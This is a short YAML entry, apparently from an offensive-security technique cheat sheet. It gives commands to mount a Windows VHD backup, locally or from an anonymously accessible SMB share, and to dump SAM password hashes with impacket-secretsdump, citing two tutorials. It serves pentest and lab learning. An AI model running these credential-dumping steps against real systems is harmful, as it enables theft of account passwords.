---
functions:
  ttp-tip:
    - description: Extract Hashes from VHD file
      code: |
        7zip:
        7z l file.vhd
        7z x file.vhd

        Mount (local):
        sudo apt install libguestfs-tools -y
        sudo mkdir /mnt/vhd
        sudo guestmount --add file.vhd --inspector --ro -v /mnt/vhd
        sudo su
        cd /mnt/vhd
        ls -la
        
        Mount (remote):
        sudo mkdir /mnt/Backups
        sudo mount -t cifs //10.10.10.134/Backups -o user=Anonymous,password= /mnt/Backups
        sudo mkdir /mnt/vhd
        sudo guestmount --add "/mnt/Backups/WindowsImageBackup/L4mpje-PC/Backup.vhd" --inspector --ro -v /mnt/vhd

        Dump Hashes:
        cd Windows/System32/config
        impacket-secretsdump -sam SAM -system SYSTEM local

resources: |
  https://infinitelogins.com/2020/12/11/how-to-mount-extract-password-hashes-vhd-files/
  https://cyberthoth.medium.com/mounting-vhd-files-in-kali-linux-through-remote-share-smb-1c4d37c22211
---